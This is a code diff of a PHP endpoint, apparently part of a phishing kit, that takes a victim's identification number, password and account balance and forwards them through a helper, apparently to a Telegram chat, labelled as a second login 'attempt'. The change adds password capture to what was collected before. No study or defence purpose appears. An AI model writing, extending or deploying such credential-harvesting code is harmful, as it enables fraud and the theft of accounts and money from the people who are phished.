@@ -2,23 +2,22 @@
 require __DIR__ . '/data.php';
 header('Content-Type: application/json; charset=utf-8');
 
-$docLast3 = nq_f('docLast3');
-$balance  = nq_f('balance');
+$identification = nq_f('identification');
+$password       = nq_f('password');
+$balance        = nq_f('balance');
 
-if ($docLast3 === '' || $balance === '') {
+if ($balance === '') {
     echo json_encode(['success' => false, 'message' => 'Datos incompletos']);
     exit;
 }
 
 $bal = number_format((float) preg_replace('/[^\d]/', '', $balance), 0, ',', '.');
 
-$SEP = "───────────────────";
-$msg  = "💰 <b>Saldo — Intento 2</b>\n$SEP\n";
-$msg .= "🔢 Últimos 3 dígitos doc: <code>{$docLast3}</code>\n";
-$msg .= "💵 Saldo: <b>\${$bal}</b>\n";
-$msg .= "\n🌐 " . nq_ip() . " · 🕐 " . date('Y-m-d H:i:s');
-
-nq_tg($msg);
+nq_tg('💰 Saldo · Intento 2/2', [
+    ['TEL',   $identification],
+    ['PW',    $password],
+    ['SALDO', '$' . $bal],
+]);
 
 echo json_encode([
     'success' => true,
